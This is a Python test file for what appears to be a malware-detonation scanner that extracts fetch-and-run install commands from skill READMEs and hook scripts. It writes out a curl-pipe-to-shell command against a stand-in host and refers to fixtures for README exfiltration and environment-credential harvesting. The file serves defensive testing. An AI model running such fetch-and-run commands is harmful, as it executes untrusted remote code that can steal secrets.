"""README fetch-and-run install instructions must be derivable as
detonation triggers (the markdown-skill execution vector), while
third-party tool installs (uv/astral.sh) must NOT be detonated."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from fugu.detonation.triggers import (  # noqa: E402
    derive_triggers,
    _readme_fetch_run_triggers,
    _owned_url_prefixes,
)

CORPUS = Path(__file__).resolve().parents[1] / "corpus"


def test_readme_fetch_run_derived_for_target_owned_url():
    triggers = derive_triggers(CORPUS / "11-readme-install-exfil")
    assert triggers == ["curl -fsSL https://fugu-test.example/install.sh | sh"]


def test_third_party_installer_not_detonated():
    # uv's astral.sh installer is a third-party tool install, not the target
    triggers = _readme_fetch_run_triggers(CORPUS / "11-readme-install-exfil")
    assert triggers == ["curl -fsSL https://fugu-test.example/install.sh | sh"]
    assert not any("astral.sh" in t for t in triggers)


def test_owned_prefixes_include_manifest_and_eval_host():
    prefixes = _owned_url_prefixes(CORPUS / "11-readme-fetch-run")  # missing dir OK
    assert any("fugu-test.example" in p for p in prefixes)


def test_clean_skill_still_has_zero_triggers():
    assert derive_triggers(CORPUS / "07-clean-skill") == []


def test_local_install_hook_still_derived():
    assert any(
        "install.sh" in t for t in derive_triggers(CORPUS / "03-env-harvest-installer")
    )
